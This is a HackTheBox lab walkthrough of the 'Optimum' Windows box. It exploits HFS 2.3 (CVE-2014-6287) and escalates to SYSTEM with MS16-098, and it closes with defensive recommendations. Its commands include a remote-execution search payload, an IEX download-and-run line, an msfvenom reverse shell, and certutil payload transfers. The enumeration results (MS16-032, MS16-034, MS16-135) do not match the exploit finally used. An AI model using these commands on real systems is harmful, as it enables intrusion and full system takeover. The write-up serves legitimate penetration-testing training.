---
title: "HackTheBox: Optimum - HFS RCE & Kernel Exploit Privesc"
date: 2026-02-21
draft: false
description: "Walkthrough of HackTheBox Optimum, exploiting HttpFileServer 2.3 RCE vulnerability and escalating to SYSTEM using MS16-098 kernel exploit."
tags: ["hackthebox", "windows", "hfs", "kernel-exploit", "privesc"]
---

## Introduction

Optimum is a Windows machine on HackTheBox that features a vulnerable HttpFileServer application and privilege escalation through kernel exploitation. This box teaches the importance of checking software versions and using enumeration tools to find the right kernel exploit.

- **Difficulty:** Easy
- **OS:** Windows
- **Skills:** Version-based exploitation, kernel exploit enumeration, Windows privilege escalation

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oN nmap/optimum 10.129.2.30
```

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | HttpFileServer 2.3 |

Only one port open running **HFS 2.3** (HttpFileServer). When we see specific software with version numbers, we immediately check for known exploits.

---

## Exploitation

### Searching for Exploits
```bash
searchsploit hfs 2.3
```
```bash
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)    | windows/remote/49584.py
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution | windows/remote/39161.py
```

Multiple RCE exploits available. HFS 2.3 is vulnerable to **CVE-2014-6287** - a remote command execution vulnerability in the search functionality.

### Understanding the Vulnerability

The vulnerability exists in how HFS handles the `%00` (null byte) in search queries. By injecting scripting commands after a null byte, we can execute arbitrary code on the server.

Payload structure:
```bash
/?search=%00{.exec|<command>.}
```

### Running the Exploit
```bash
searchsploit -m 49584
```

Edit the exploit to set our IP and port:
```python
lhost = "10.10.14.3"
lport = 4444
rhost = "10.129.2.30"
rport = 80
```

Run the exploit:
```bash
python3 49584.py
```

We get a PowerShell shell as `kostas`.

---

## Privilege Escalation

### Checking Privileges
```bash
whoami /priv
```
```bash
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

No useful privileges like SeImpersonatePrivilege. We need to look for kernel exploits.

### System Information
```bash
systeminfo
```

| Finding | Value |
|---------|-------|
| OS | Windows Server 2012 R2 |
| Build | 6.3.9600 |
| Architecture | x64 |
| Hotfixes | 31 installed (last from 2015) |

The hotfixes are old, indicating the system is vulnerable to kernel exploits from 2016 onwards.

### Finding Vulnerabilities with Sherlock

Sherlock is a PowerShell script that checks for known kernel vulnerabilities:
```bash
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

Host it and run on target:
```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/Sherlock.ps1'); Find-AllVulns | Out-File C:\Users\kostas\Desktop\vulns.txt
```
```bash
type vulns.txt
```

Results:
```bash
Title      : Secondary Logon Handle
MSBulletin : MS16-032
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
VulnStatus : Appears Vulnerable
```

Three potential kernel exploits found.

### Escaping PowerShell

Kernel exploits can behave differently depending on the shell type. PowerShell sometimes causes issues with process creation. Getting a cmd shell is more reliable.

Create a reverse shell executable:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4445 -f exe -o rev.exe
```

Start listener:
```bash
nc -lvnp 4445
```

Transfer and execute on target:
```bash
certutil -urlcache -f http://10.10.14.3:8000/rev.exe rev.exe
.\rev.exe
```

Now we have a cmd shell as kostas.

### Running MS16-098

Download the exploit:
```bash
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-098/bfill.exe
```

Transfer to target:
```bash
certutil -urlcache -f http://10.10.14.3:8000/bfill.exe bfill.exe
```

Execute:
```bash
bfill.exe
```
```bash
whoami
nt authority\system
```

---

## Attack Path Summary
```bash
Nmap (port 80 - HFS 2.3)
        │
        ▼
searchsploit hfs 2.3
        │
        ▼
CVE-2014-6287 RCE exploit
        │
        ▼
Shell as kostas (PowerShell)
        │
        ▼
whoami /priv - no useful privileges
        │
        ▼
systeminfo - Server 2012 R2, old hotfixes
        │
        ▼
Sherlock - found MS16-032, MS16-034, MS16-135
        │
        ▼
rev.exe - escaped to cmd shell
        │
        ▼
bfill.exe (MS16-098)
        │
        ▼
SYSTEM
```

---

## Key Takeaways

### Why This Attack Worked

| Vulnerability | Impact |
|---------------|--------|
| HFS 2.3 RCE (CVE-2014-6287) | Remote code execution |
| Outdated Windows patches | Kernel exploits available |
| MS16-098 not patched | Privilege escalation to SYSTEM |

### Defensive Measures

| Recommendation | Priority |
|----------------|----------|
| Update HFS or remove it | Critical |
| Apply Windows security patches | Critical |
| Use latest Windows Server version | High |
| Regular vulnerability scanning | Medium |

---

## Lessons Learned

1. **Check software versions** - Specific versions often have known exploits
2. **Use Sherlock for kernel enumeration** - Quickly identifies vulnerable systems
3. **PowerShell vs CMD** - Kernel exploits may work better in cmd shells
4. **Try multiple exploits** - If one fails, others might work
5. **Patience with kernel exploits** - They can be unreliable, try different approaches

---

## Tools Used

- Nmap
- searchsploit
- Python3
- Sherlock
- msfvenom (payload generation only)
- certutil
- Netcat

---

## References

- [CVE-2014-6287 - HFS RCE](https://nvd.nist.gov/vuln/detail/CVE-2014-6287)
- [MS16-098 - Windows Kernel Exploit](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098)
- [Sherlock - Windows Privilege Escalation](https://github.com/rasta-mouse/Sherlock)

---

*This writeup is for educational purposes. Only test on systems you have permission to access.*
